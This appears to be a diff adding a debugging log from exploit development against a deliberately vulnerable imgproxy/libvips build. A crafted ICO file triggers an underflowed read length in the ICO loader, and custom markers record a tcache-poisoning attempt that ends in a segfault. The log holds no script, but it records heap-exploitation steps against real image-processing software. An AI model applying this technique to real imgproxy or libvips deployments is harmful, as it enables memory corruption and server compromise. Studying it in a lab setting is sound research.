@@ -1,0 +1,53 @@
+CLIENT target=0x61000000 preload=2 benign[0]=200:'����\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00��\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\n\x10\n\n\t\t\n\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a' benign[1]=200:'����\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00��\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\n\x10\n\n\t\t\n\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a' hostile=RemoteDisconnected:Remote end closed connection without response
+=== GDB OUTPUT ===
+warning: File "/home/mesh-home/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.0.linux-amd64/src/runtime/runtime-gdb.py" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
+To enable execution of this file add
+	add-auto-load-safe-path /home/mesh-home/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.0.linux-amd64/src/runtime/runtime-gdb.py
+line to your configuration file "/home/mesh-home/.config/gdb/gdbinit".
+To completely disable this security protection add
+	set auto-load safe-path /
+line to your configuration file "/home/mesh-home/.config/gdb/gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+	info "(gdb)Auto-loading safe path"
+Breakpoint 1 at 0x2da86f0: file vips.c, line 1304.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7fffaeb9f6c0 (LWP 3493022)]
+[New Thread 0x7fffae39e6c0 (LWP 3493023)]
+[New Thread 0x7fffad39c6c0 (LWP 3493025)]
+[New Thread 0x7fffadb9d6c0 (LWP 3493024)]
+[New Thread 0x7fffacb9b6c0 (LWP 3493026)]
+[New Thread 0x7fff97fff6c0 (LWP 3493032)]
+[New Thread 0x7fff977fe6c0 (LWP 3493033)]
+[New Thread 0x7fff96ffd6c0 (LWP 3493034)]
+[New Thread 0x7fff967fc6c0 (LWP 3493038)]
+[New Thread 0x7fff95ffb6c0 (LWP 3493039)]
+[New Thread 0x7fff957fa6c0 (LWP 3493040)]
+[New Thread 0x7fff949ff6c0 (LWP 3493157)]
+[New Thread 0x7fff77fff6c0 (LWP 3493158)]
+[New Thread 0x7fff777fe6c0 (LWP 3493185)]
+[New Thread 0x7fff76ffd6c0 (LWP 3493186)]
+[New Thread 0x7fff767fc6c0 (LWP 3493187)]
+[Switching to Thread 0x7fff977fe6c0 (LWP 3493033)]
+
+Thread 8 "imgproxy-vuln" hit Breakpoint 1, vips_foreign_load_read_full (source=0x7fff880df280, buf=buf@entry=0x7fff880b046e, len=len@entry=4294967285) at vips.c:1304
+1304	{
+W6_HIT len=0xfffffff5 buf=0x7fff880b046e
+W6_PRE pos=0x7fff880b0480 next=0x7ff877f38150 key=0x7fff880b0 decoded=0x7fff880b01e0
+0x0000000002da4ec2 in vips_foreign_load_ico_header (load=0x7fff880e4850) at icoload.c:161
+161	  if (vips_foreign_load_read_full(ico->source, actual_data, data_size) <= 0) {
+Value returned is $1 = 0
+W6_WIRE next_after_body=0x4141414141414141 size=0x35
+W6_PATCHED next=0x79ef880b0 encoded_from=0x61000000
+W6_M1 0x7fff880b0480
+W6_TCACHE entry1=0x61000000 count1=6
+Catchpoint 2 (signal SIGSEGV)
+
+Thread 8 "imgproxy-vuln" hit Catchpoint 2 (signal SIGSEGV), 0x00007ffff76ad8a1 in tcache_get_n (ep=<optimized out>, tc_idx=<optimized out>) at ./malloc/malloc.c:3186
+warning: 3186	./malloc/malloc.c: No such file or directory
+/tmp/ico-tcache-w6v9-tgf4ppvj.cmd:27: Error in sourced command file:
+The program being debugged stopped while in a function called from GDB.
+Evaluation of the expression containing the function
+(__GI___libc_malloc) will be abandoned.
+When the function is done executing, GDB will silently stop.
